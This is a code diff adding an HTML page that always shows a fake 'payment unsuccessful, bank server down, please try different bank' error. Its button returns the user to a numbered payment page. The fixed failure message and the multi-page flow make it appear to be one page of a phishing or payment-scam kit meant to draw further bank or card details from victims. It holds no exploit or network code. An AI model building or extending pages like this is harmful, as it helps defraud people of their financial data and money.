@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Unsuccessful - Server Down</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .form-container { background: #ffffff; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; text-align: center; }
+        
+        /* Warning Icon */
+        .icon-box { font-size: 50px; color: #dc3545; margin-bottom: 15px; }
+
+        /* Bada aur Mota Error Message */
+        .error-title {
+            color: #dc3545;
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .error-desc {
+            color: #333;
+            font-size: 16px;
+            font-weight: 700;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        /* Try Again Button */
+        .btn-try-again {
+            width: 100%;
+            padding: 14px;
+            background: #0056b3;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background 0.3s ease;
+        }
+        .btn-try-again:hover {
+            background: #004085;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="icon-box">⚠️</div>
+        <div class="error-title">PAYMENT UNSUCCESSFUL</div>
+        <div class="error-desc">
+            BANK SERVER DOWN<br>
+            PLEASE TRY DIFFERENT BANK
+        </div>
+
+        <!-- Try Again Button jo seedha 4th page par le jayega -->
+        <button type="button" class="btn-try-again" onclick="tryAgain()">TRY AGAIN</button>
+    </div>
+
+    <script>
+        function tryAgain() {
+            // Turant 4th page (payment page) par bhej dega
+            window.location.href = "page4.html";
+        }
+    </script>
+</body>
+</html>
